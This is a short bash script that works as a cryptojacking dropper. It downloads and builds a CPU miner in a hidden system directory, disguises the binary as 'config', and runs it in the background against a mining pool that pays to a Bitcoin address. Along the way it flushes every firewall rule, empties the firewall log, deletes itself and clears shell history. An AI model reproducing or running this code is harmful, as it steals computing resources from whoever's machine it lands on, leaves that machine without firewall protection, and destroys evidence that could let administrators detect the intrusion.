#!/usr/bin/bash
rm m.sh
apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
apt-get install make git nano autoconf automake -y > /dev/null
git clone https://github.com/noncepool/cpuminer-yescrypt.git /usr/share/.mx > /dev/null
cd /usr/share/.mx
./autogen.sh
./configure CFLAGS="-O3"
make
sysctl -w net.ipv4.ip_forward=0
echo -n > /var/log/iptables.log
iptables -F
iptables -X
iptables -Z
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
mv minerd config
nohup ./config -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Loch2rNJWp3eNgUjiZaa92nZvQyP9pT6F -p c=BTC &
history -c
